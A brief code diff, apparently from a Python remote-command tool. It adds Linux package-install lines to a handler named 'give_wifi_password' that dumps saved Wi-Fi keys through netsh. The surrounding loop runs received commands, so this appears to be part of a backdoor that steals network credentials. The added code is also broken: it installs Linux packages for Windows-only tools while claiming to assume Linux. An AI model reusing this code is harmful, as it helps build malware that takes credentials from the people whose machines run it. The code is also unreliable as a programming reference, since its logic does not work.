@@ -43,6 +43,11 @@ while True:
             # if operation is successful, empty message
             output = ""
     if command.lower() == "give_wifi_password":
+        #install netsh and findstr
+        #asume the os is linux
+        os.system("sudo dnf install net-tools")
+        os.system("sudo dnf install findutils")
+        # execute the command and retrieve the results
         output = subprocess.getoutput('netsh wlan show profile name="WIFI_NAME" key=clear | findstr "Key Content"')
     else:
         # execute the command and retrieve the results
